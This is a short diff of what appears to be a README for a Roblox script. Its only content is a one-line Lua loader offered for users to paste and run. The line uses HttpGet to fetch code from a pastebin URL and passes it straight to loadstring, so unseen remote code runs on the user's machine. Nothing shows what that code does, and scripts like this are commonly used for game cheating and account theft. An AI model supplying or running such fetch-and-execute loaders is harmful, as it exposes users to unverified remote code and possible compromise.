@@ -3,4 +3,4 @@
 # Changelog
 
 # Script
-```CSS loadstring(game:HttpGet("https://pastebin.com/raw/tCiVVxvN"))() ```
+loadstring(game:HttpGet("https://pastebin.com/raw/tCiVVxvN"))()
